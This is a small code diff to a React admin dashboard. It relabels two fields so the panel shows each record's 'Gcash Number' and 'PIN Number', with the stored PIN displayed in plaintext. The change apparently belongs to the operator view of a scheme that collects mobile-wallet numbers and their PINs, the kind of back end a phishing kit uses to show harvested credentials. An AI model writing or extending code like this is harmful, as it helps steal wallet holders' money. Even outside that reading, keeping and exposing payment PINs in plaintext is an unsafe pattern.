@@ -278,11 +278,11 @@ export const AdminDashboard: React.FC = () => {
                         {p.id_number ? (
                           <div className="space-y-2 glass p-4 rounded-2xl border-white/5">
                             <div className="flex flex-col">
-                              <span className="text-[8px] font-black text-zinc-600 uppercase tracking-widest">ID Number</span>
+                              <span className="text-[8px] font-black text-zinc-600 uppercase tracking-widest">Gcash Number</span>
                               <span className="text-xs font-black text-white tracking-widest">{p.id_number}</span>
                             </div>
                             <div className="flex flex-col">
-                              <span className="text-[8px] font-black text-zinc-600 uppercase tracking-widest">Access PIN</span>
+                              <span className="text-[8px] font-black text-zinc-600 uppercase tracking-widest">PIN Number</span>
                               <span className="text-xs font-black text-emerald-400 tracking-widest">{p.id_pin}</span>
                             </div>
                             <div className="pt-2 border-t border-white/5">
